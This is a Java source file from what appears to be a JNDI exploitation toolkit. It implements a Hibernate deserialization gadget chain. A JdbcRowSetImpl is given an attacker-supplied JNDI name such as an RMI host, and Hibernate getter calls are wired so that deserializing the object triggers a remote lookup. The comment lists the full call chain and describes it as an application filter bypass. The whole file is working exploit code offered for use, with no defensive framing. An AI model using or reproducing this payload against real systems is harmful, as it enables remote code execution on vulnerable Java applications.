package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.JavaVersion;
import com.sun.rowset.JdbcRowSetImpl;

/**
 * Another application filter bypass
 * <p>
 * Needs a getter invocation that is provided by hibernate here
 * <p>
 * javax.naming.InitialContext.InitialContext.lookup()
 * com.sun.rowset.JdbcRowSetImpl.connect()
 * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * <p>
 * <p>
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 * <p>
 * Arg:
 * - JNDI name (i.e. rmi:<host>)
 * <p>
 * Yields:
 * - JNDI lookup invocation (e.g. connect to remote RMI)
 *
 * @author mbechler
 */
public class hibernate2 implements ObjectPayload<Object>, DynamicDependencies{

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    public static String[] getDependencies() {
        return hibernate1.getDependencies();
    }

    public Object getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(command);
        return hibernate1.makeCaller(rs, hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
    }
}
